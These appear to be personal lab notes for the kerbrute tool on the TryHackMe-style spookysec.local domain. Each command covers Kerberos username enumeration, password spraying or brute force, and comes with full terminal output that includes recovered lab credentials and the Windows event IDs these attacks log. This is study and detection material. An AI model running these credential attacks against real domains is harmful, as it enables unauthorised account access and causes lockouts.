
obs! last updated 2019 - version 1.0.3! - Still mostly works though
(The date shown in the file date)

a quick way to enumerate users using a wordlist and asreproasting
	= checking is an account doesn't require preauth (so we can get the hash without authenticating - but here we just use it to enum, not actually check for a hash or even if it is a no preauth account)
(in the code we see get hash functionality though)

### Enumerating users

`~/tools/kerbrute userenum -d domain.com --dc 10.10.10.10 usernames.txt` 

```sh
┌──(kali㉿proxli)-[~/boxes/thm/attacktive]
└─$ ~/tools/kerbrute userenum -d spookysec.local --dc 10.10.229.142 userlist.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/04/25 - Ronnie Flathers @ropnop

2025/07/04 19:19:37 >  Using KDC(s):
2025/07/04 19:19:37 >   10.10.229.142:88

2025/07/04 19:19:37 >  [+] VALID USERNAME:       james@spookysec.local
2025/07/04 19:19:38 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2025/07/04 19:19:39 >  [+] VALID USERNAME:       James@spookysec.local
2025/07/04 19:19:39 >  [+] VALID USERNAME:       robin@spookysec.local
2025/07/04 19:19:43 >  [+] VALID USERNAME:       darkstar@spookysec.local
2025/07/04 19:19:45 >  [+] VALID USERNAME:       administrator@spookysec.local
2025/07/04 19:19:49 >  [+] VALID USERNAME:       backup@spookysec.local
2025/07/04 19:19:51 >  [+] VALID USERNAME:       paradox@spookysec.local
2025/07/04 19:20:03 >  [+] VALID USERNAME:       JAMES@spookysec.local
2025/07/04 19:20:08 >  [+] VALID USERNAME:       Robin@spookysec.local
2025/07/04 19:20:32 >  [+] VALID USERNAME:       Administrator@spookysec.local
2025/07/04 19:21:21 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2025/07/04 19:21:37 >  [+] VALID USERNAME:       Paradox@spookysec.local
2025/07/04 19:22:30 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2025/07/04 19:22:45 >  [+] VALID USERNAME:       ori@spookysec.local
2025/07/04 19:23:18 >  [+] VALID USERNAME:       ROBIN@spookysec.local
2025/07/04 19:25:13 >  Done! Tested 73317 usernames (16 valid) in 336.514 seconds
```

Logged event(s):
[4768 - A Kerberos authentication ticket (TGT) was requested](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768)

### Password spray

`~/tools/kerbrute passwordspray -d domain.com --dc 10.10.10.10 domain_users password123`

```sh
┌──(kali㉿proxli)-[~/boxes/thm/attacktive]
└─$ ~/tools/kerbrute passwordspray -d spookysec.local --dc 10.10.229.142 users.txt management2005

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/04/25 - Ronnie Flathers @ropnop

2025/07/04 19:42:01 >  Using KDC(s):
2025/07/04 19:42:01 >   10.10.229.142:88

2025/07/04 19:42:01 >  [+] VALID LOGIN:  svc-admin@spookysec.local:management2005
2025/07/04 19:42:01 >  Done! Tested 8 logins (1 successes) in 0.104 seconds
```

```sh
┌──(kali㉿proxli)-[~/boxes/thm/attacktive]
└─$ ~/tools/kerbrute passwordspray -d spookysec.local --dc 10.10.229.142 users.txt Password123  

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/04/25 - Ronnie Flathers @ropnop

2025/07/04 19:42:22 >  Using KDC(s):
2025/07/04 19:42:22 >   10.10.229.142:88

2025/07/04 19:42:22 >  Done! Tested 8 logins (0 successes) in 0.216 seconds
```

Logged event(s):
[4768 - A Kerberos authentication ticket (TGT) was requested](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768)
[4771 - Kerberos pre-authentication failed](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4771)

### Brute force specific user

`~/tools/kerbrute bruteuser -d domain.com --dc 10.10.10.10 passwords.txt usernamehere`

```
┌──(kali㉿proxli)-[~/boxes/thm/attacktive]
└─$ ~/tools/kerbrute bruteuser -d spookysec.local --dc 10.10.229.142 passwordlist.txt a-spooks    

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/04/25 - Ronnie Flathers @ropnop

2025/07/04 20:02:44 >  Using KDC(s):
2025/07/04 20:02:44 >   10.10.229.142:88

2025/07/04 20:15:49 >  Done! Tested 70188 logins (0 successes) in 784.784 seconds
```

Logged event(s):
[4768 - A Kerberos authentication ticket (TGT) was requested](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768)
[4771 - Kerberos pre-authentication failed](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4771)

### Brute Force with stdin info

`cat creds-pairs.txt | ~/tools/kerbrute ** **-d domain.com --dc 10.10.10.10 -`
where cread-pairs.txt has the format user:pass, one pair per line

```sh
┌──(kali㉿proxli)-[~/boxes/thm/attacktive]
└─$ ~/tools/kerbrute bruteforce -d spookysec.local --dc 10.10.229.142 user-pass.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/04/25 - Ronnie Flathers @ropnop

2025/07/04 20:30:43 >  Using KDC(s):
2025/07/04 20:30:43 >   10.10.229.142:88

2025/07/04 20:30:43 >  [+] VALID LOGIN:  svc-admin@spookysec.local:management2005
2025/07/04 20:30:43 >  [+] VALID LOGIN:  backup@spookysec.local:backup2517860
2025/07/04 20:30:43 >  Done! Tested 2 logins (2 successes) in 0.304 seconds
```

Logged event(s):
[4768 - A Kerberos authentication ticket (TGT) was requested](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768)
[4771 - Kerberos pre-authentication failed](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4771)

### Help

```sh
┌──(kali㉿proxli)-[~/tools]
└─$ ./kerbrute -h             

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/04/25 - Ronnie Flathers @ropnop

This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts

Usage:
  kerbrute [command]

Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user´s password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit

Flags:
      --dc string       The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
      --delay int       Delay in millisecond between each attempt. Will always use single thread if set
  -d, --domain string   The full domain to use (e.g. contoso.com)
  -h, --help            help for kerbrute
  -o, --output string   File to write logs to. Optional.
      --safe            Safe mode. Will abort if any user comes back as locked out. Default: FALSE
  -t, --threads int     Threads to use (default 10)
  -v, --verbose         Log failures and errors

Use "kerbrute [command] --help" for more information about a command.
```

```sh
┌──(kali㉿proxli)-[~/tools]
└─$ ./kerbrute userenum --help

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/04/25 - Ronnie Flathers @ropnop

Will enumerate valid usernames from a list by constructing AS-REQs to requesting a TGT from the KDC.
If no domain controller is specified, the tool will attempt to look one up via DNS SRV records.
A full domain is required. This domain will be capitalized and used as the Kerberos realm when attempting the bruteforce.
Valid usernames will be displayed on stdout.

Usage:
  kerbrute userenum [flags] <username_wordlist>

Flags:
  -h, --help   help for userenum

Global Flags:
      --dc string       The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
      --delay int       Delay in millisecond between each attempt. Will always use single thread if set
  -d, --domain string   The full domain to use (e.g. contoso.com)
  -o, --output string   File to write logs to. Optional.
      --safe            Safe mode. Will abort if any user comes back as locked out. Default: FALSE
  -t, --threads int     Threads to use (default 10)
  -v, --verbose         Log failures and errors
```
